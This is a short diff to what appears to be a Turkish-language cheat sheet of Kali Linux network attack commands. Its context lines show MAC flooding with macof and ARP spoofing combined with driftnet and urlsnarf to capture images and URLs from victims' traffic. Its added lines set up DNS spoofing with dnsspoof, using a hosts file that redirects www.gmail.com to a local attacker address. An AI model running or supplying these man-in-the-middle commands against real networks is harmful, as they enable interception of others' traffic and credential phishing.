@@ -25,3 +25,11 @@ macof : macof -i <interface> -s <ipadresi> -n 10000  : cam tablosunu doldurarak 
 
 driftnet : arpspoof -i wlan0 -t <ip> <ip>   //     driftnet -i wlan0 -v
 urlsnarf : arpspoof -i wlan0 -t <ip> <ip>   //     urlsnarf -i wlan0 -p pcapfile
+
+
+-------------------------------------------- dns spoofing ------------------------
+root@kali:~# cat hosts.txt
+192.168.1.9 www.gmail.com
+192.168.1.9 someplace.com
+root@kali:~# dnsspoof -i eth0 -f hosts.txt
+----------------------------------------------------------------------------------
